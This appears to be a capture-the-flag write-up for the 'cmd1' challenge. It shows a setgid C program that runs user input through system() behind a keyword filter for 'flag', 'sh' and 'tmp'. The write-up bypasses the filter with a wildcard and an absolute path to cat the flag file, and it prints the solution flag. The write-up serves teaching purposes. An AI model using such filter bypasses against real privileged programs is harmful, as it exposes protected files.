---
custom_edit_url: null
sidebar_position: 12
---

> Mommy! what is PATH environment in Linux?

## File properties

```
cmd1@ubuntu:~$ file ./cmd1
./cmd1: setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=38e83bafff424226079859e0fe26757437e79a2d, for GNU/Linux 3.2.0, not stripped
```

## Source code

```c title="cmd1.c"
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv("PATH=/thankyouverymuch");
    if(filter(argv[1])) return 0;
    setregid(getegid(), getegid());
    system( argv[1] );
    return 0;
}
```

Theprogram sets the `$PATH` environment variable to `/thankyouverymuch`, and checks if the user input contains the following:
  - `flag`
  - `sh`
  - `tmp`

If it does, the program returns early.

Otherwise, it executes the argument using `system()`.

### [`system`](https://man7.org/linux/man-pages/man3/system.3.html)

```c
int system(const char *command);
```

The `system()` function essentially executes the argument that is passed to it. 
So, the user's input will be executed by `system()`.

The easiest way to solve this challenge is to use wildcard (`*`) character.

We can simply `cat` out `fla*`, and since it does not get caught in any filter, we should be good.

```
cmd1@ubuntu:~$ ./cmd1 "cat fla*"
sh: 1: cat: not found
```

This is because the program overwrites the `$PATH` env variable.

Ideally this is what it looks like.

```
cmd1@ubuntu:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

When `cat` is run, each of paths are prepended to it once by one. 
Wherever, `cat` is located in the system, that path will work.

Let's check it is located.

```
cmd1@ubuntu:~$ which cat
/usr/bin/cat
```

Now that we know the location, we can easily provide the entire path in the argument, so that the `$PATH` env variable does not come into use.

```
cmd1@ubuntu:~$ ./cmd1 "/usr/bin/cat fla*"
PATH_environment?_Now_I_really_g3t_it,_mommy!
```

There are a TON of other way to solve this challenge.
